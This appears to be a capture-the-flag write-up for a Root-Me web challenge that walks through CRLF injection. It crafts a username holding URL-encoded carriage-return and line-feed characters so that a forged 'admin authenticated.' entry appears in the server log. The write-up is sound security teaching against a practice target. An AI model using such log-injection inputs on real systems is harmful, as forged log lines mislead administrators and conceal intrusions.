# Challenge18: CRLF

## Ref
+ w3schools: https://www.w3schools.com/tags/ref_urlencode.ASP

## Solution

1. This challenge is about '\r' and '\n' symbols
2. Open Burp suite and go to the target url: http://challenge01.root-me.org/web-serveur/ch14/
3. Try to login with your information, for example:
```
GET web-serveur/ch14/username=dangphuc&password=godyzac

Result:
dangphuc failed to authenticate.
```
4. After a while, i realize that we don't need to send password to login:

```
GET web-serveur/ch14/username=dangphuc

Result:
dangphuc failed to authenticate.
```
    
5. This is the sample logs:

```
admin authenticated.
guest failed to authenticate.
```
    
6. So now think of CRLF('\r' & '\n'), Can we log the same as 5 ?

```
GET web-serveur/ch14/username=admin%20authenticated.%0D%0Aguest
                                ^
                                |
                                |
                    username = "admin authenticated.\r\nguest"
```

7. When you make the request in step 6, you will get the flag :)
